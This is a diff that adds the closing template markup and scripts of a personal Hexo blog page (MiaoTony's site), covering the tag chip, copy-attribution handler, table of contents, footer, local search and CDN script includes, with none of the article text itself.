+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('200')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: MiaoTony&#39;s小窝<br />'
+            + '文章作者: MiaoTony<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('1'),
+            headingSelector: 'h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+        <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <a href="/about" target="_blank">MiaoTony</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">203k</span>&nbsp;字
+                                                                                    <span id="busuanzi_container_site_pv">
+			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+                                    <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+                        <br>
+                        <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "11";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+                        <br>
+                    </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
+        <i class="fab fa-telegram"></i>
+    </a>
+
+
+
+    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/js/matery.min.js"></script>
+
+    
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
